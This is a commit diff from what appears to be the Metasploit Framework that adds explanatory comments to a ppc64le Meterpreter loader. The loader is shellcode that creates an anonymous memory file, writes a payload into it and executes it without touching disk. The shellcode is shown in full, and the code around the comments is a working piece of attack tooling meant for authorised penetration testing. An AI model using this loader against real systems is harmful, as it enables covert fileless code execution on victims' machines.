a627cb28750398f75dce4a4d18a1f881b356625a
Martin Sutovsky <martin_sutovsky@rapid7.com>
2025-05-19 13:54:29 +0200

    Adds comments for ARM, Mips and PPC

--- lib/msf/core/payload/linux/ppc64le/meterpreter_loader.rb
+++ lib/msf/core/payload/linux/ppc64le/meterpreter_loader.rb
@@ -8,14 +8,22 @@
 module Msf::Payload::Linux::Ppc64le::MeterpreterLoader
   def in_memory_load(payload)
     in_memory_loader = [
+        
+        # jump to address 0x105c
         0x4800005c, #0x1000:	b	0x105c	0x4800005c
+        
+        # move from link register (lr) to r15
         0x7de802a6, #0x1004:	mflr	r15	0x7de802a6
+        
+        # fd = memfd_create(NULL,MFD_CLOEXEC)
         0x39c00000, #0x1008:	li	r14, 0	0x39c00000
         0x95c10000, #0x100c:	stwu	r14, 0(r1)	0x95c10000
         0x7c230b78, #0x1010:	mr	r3, r1	0x7c230b78
         0x38800000, #0x1014:	li	r4, 0	0x38800000
         0x38000168, #0x1018:	li	r0, 0x168	0x38000168
         0x44000002, #0x101c:	sc		0x44000002
+        
+        # write(fd, payload length, payload pointer)
         0x7df07b78, #0x1020:	mr	r16, r15	0x7df07b78
         0x7c711b78, #0x1024:	mr	r17, r3	0x7c711b78
         0x80af0000, #0x1028:	lwz	r5, 0(r15)	0x80af0000
@@ -23,6 +31,8 @@ module Msf::Payload::Linux::Ppc64le::MeterpreterLoader
         0x7de47b78, #0x1030:	mr	r4, r15	0x7de47b78
         0x38000004, #0x1034:	li	r0, 4	0x38000004
         0x44000002, #0x1038:	sc		0x44000002
+        
+        # execveat(fd, null,null,null, AT_EMPTY_PATH)
         0x7e238b78, #0x103c:	mr	r3, r17	0x7e238b78
         0x95c10000, #0x1040:	stwu	r14, 0(r1)	0x95c10000
         0x7c240b78, #0x1044:	mr	r4, r1	0x7c240b78
@@ -31,6 +41,8 @@ module Msf::Payload::Linux::Ppc64le::MeterpreterLoader
         0x38e01000, #0x1050:	li	r7, 0x1000	0x38e01000
         0x3800016a, #0x1054:	li	r0, 0x16a	0x3800016a
         0x44000002, #0x1058:	sc		0x44000002
+
+        # jump back to adress 0x1004, store address following this instruction in link register (lr)
         0x4bffffa9, #0x105c:	bl	0x1004	0x4bffffa9
         payload.length
     ].pack('V*')
